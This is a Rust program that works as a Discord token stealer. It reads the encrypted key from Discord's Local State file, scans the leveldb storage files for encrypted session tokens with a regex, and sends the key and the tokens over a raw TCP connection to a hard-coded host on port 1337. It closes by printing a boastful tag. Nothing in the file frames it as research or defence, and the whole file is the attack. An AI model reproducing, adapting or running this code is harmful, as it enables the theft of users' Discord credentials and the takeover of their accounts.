use std::{net::TcpStream, io::Write};
use std::env;
use serde_json::Value;
use std::fs;
use std::path::Path;
use std::ffi::OsStr;
use walkdir::WalkDir;
extern crate winapi;
use regex::Regex;


fn read_file_vec(filepath: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let data = fs::read(filepath)?;
    Ok(data)
}
fn get_extension_from_filename(filename: &str) -> Option<&str> {
    Path::new(filename)
        .extension()
        .and_then(OsStr::to_str)
}
fn main() {
    let mut stream = TcpStream::connect("10.211.55.24:1337").expect("");
    let local = env::var("LOCALAPPDATA").expect("Local App Data not found");
    let roaming = env::var("APPDATA").expect("App Data not found");
    let _chrome = local + "\\Google\\Chrome\\User Data";
    let discordpath_localstate = roaming.clone()+"\\discord"+"\\Local State";
    let discordpath_localstorage = roaming.clone()+"\\discord"+"\\Local Storage\\leveldb\\";
    let discord_data = fs::read_to_string(discordpath_localstate).expect("Couldn't read file");
    let local_state: Value = serde_json::from_str(&discord_data).unwrap();
    let os_encryptkey = local_state["os_crypt"]["encrypted_key"].to_string();
    for entry in WalkDir::new(discordpath_localstorage.clone()) {
        let entry = entry.unwrap();
        let path = entry.path().display().to_string();
        if path == discordpath_localstorage.clone(){}
        else{
            let fileextension = get_extension_from_filename(&path);
            if fileextension != None {
                if fileextension.unwrap() == "ldb"{
                    let ldbvector = read_file_vec(&path).unwrap();
                    let parse = String::from_utf8_lossy(&ldbvector);
                    let re = Regex::new(r#"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*"#).unwrap();
                    if re.find(&parse)!=None{
                        let encrypted_token = re.find(&parse).unwrap().as_str();
                        let client_response = "Os_Key: ".to_owned() + &os_encryptkey.clone() + "\n" + "Encrypted token: " + encrypted_token;
                        stream.write(client_response.as_bytes()).unwrap();
                    }
                }
            }
        }
    }    
    println!("CAT MAFIA ON TOP")
}
